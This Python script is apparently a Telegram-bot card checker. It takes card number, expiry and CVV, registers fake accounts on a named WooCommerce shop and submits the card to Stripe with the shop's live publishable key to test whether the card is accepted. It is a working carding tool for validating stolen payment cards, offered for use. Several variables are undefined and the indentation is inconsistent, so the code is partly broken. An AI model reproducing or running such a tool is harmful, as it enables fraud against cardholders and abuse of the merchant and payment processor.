import requests,re,random,time,string,base64
from bs4 import BeautifulSoup

def Tele(cx):
    cc = cx.split("|")[0]
    bin=cc[:6]
    mes = cx.split("|")[1]
    ano = cx.split("|")[2]
    cvv = cx.split("|")[3]
    if "20" in ano:
        ano = ano.split("20")[1]
        # Generate random user agent (assuming you have a library like `user_agent` installed)
        user = user_agent.generate_user_agent()

        r = requests.session()

        # Function to generate random account (email)
        def generate_random_account():
            name = ''.join(random.choices(string.ascii_lowercase, k=20))
            number = ''.join(random.choices(string.digits, k=4))
            return f"{name}{number}@yahoo.com"

        acc = generate_random_account()

        # Function to generate random username
        def username():
            name = ''.join(random.choices(string.ascii_lowercase, k=20))
            number = ''.join(random.choices(string.digits, k=20))
            return f"{name}{number}"

        generated_username = username()

        # Function to generate a random code
        def generate_random_code(length=32):
            letters_and_digits = string.ascii_letters + string.digits
            return ''.join(random.choice(letters_and_digits) for _ in range(length))

        corr = generate_random_code()
        sess = generate_random_code()

        # First request to get the register nonce
        headers = {'User-Agent': user}
        response = r.get('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers)
        register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

        # Registration data
        data = {
	    'email': acc,
	    'password': 'ASDzxc#123#',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_session_entry': 'https://purpleprofessionalitalia.it/my-account/',
	    'wc_order_attribution_session_start_time': '2024-10-17 14:07:30',
	    'wc_order_attribution_session_pages': '2',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'mailchimp_woocommerce_newsletter': '1',
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Registrati',
	}

        # POST request to register the user
        response = r.post('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers, data=data)

        # Get payment method page
        response = r.get('https://purpleprofessionalitalia.it/my-account/add-payment-method/', cookies=r.cookies, headers=headers)

        # Extract nonce for adding the card
        nonce = re.findall(r'"add_card_nonce":"(.*?)"', response.text)[0]

        # Data for creating a payment method on Stripe
        data = f'type=card&billing_details[name]=+&billing_details[email]=iegeodftomeppqjdgk%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NGkNqLqrv9VwaLxkKg6NxZWrX6UGN6mRkVNuvXXVzVepSrskeWwFwR3ExA8QOVeFCC1kBW5yQomPrJp44akaqxV00Dj7dk5cN'

        # POST request to Stripe API for payment method creation
        headers = {
            'User-Agent': user,
        }

        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        # Check if Stripe returned a valid ID
        if 'id' not in stripe_response.json():
            print('ERROR: CARD CREATION FAILED')
            bot.reply_to(message, "Error: Failed to create payment method.")
        else:
            payment_id = stripe_response.json()['id']

            # Final request to complete the payment intent
            headers = {
                'User-Agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'wc-ajax': 'wc_stripe_create_setup_intent',
            }

            data = {
                'stripe_source_id': payment_id,
                'nonce': nonce,
            }

            response = r.post('https://purpleprofessionalitalia.it/', params=params, cookies=r.cookies, headers=headers, data=data)
    soup = BeautifulSoup(response.text, 'html.parser')
    try:  
      msg = soup.find('i', class_='nm-font nm-font-close').parent.text.strip()
    except:
      return "Status code avs: Gateway Rejected: avs"
    try:
    	if "Status code avs: Gateway Rejected: avs" in msg:
    		return msg
    except:
    	return "Status code avs:"
    else:
    	return msg